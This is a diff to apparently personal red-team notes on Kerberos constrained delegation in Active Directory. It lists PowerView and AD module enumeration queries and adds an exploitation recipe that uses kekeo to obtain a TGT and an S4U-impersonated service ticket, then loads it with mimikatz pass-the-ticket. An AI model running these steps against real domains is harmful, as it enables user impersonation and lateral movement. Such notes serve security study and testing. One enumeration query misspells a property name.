@@ -11,7 +11,6 @@ The service can only ask for impersonation `ST` for certain services defined in 
 ### S4U2Self
 - Kerberos delegation when the client does not support Kerberos protocol. (Protocol Transition)
 - In this scenario, the service which has the "TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION" flag set, can request a TGS for the another service for the user.
-
 # Enumeration
 - Enumerating users and computers which contrained delegation enabled
 - Powerview:
@@ -22,4 +21,15 @@ Get-DomainComputer -TrustedToAuth
 - Active Directory Module
 ```powershell
 Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDeleagateTo
+```
+# Exploitation
+- Getting a TGT for the account that can delegate
+```powershell
+kekeo tgt::ask /user:svcIIS /domain:mydomain.local /password:Qwer1234.
+# this will save the TGT file to the disk
+# use this TGT to request TGS for the delegated service
+kekeo tgs::s4u /tgt:<tgt_file> /user:<user_to_inpersonate> /service:<service_allowed_to_delegate_to>
+# this will save the TGS to the disk
+# we can load this ticket it memory
+mimikatz kerberos::ptt <ticket_file>
 ```
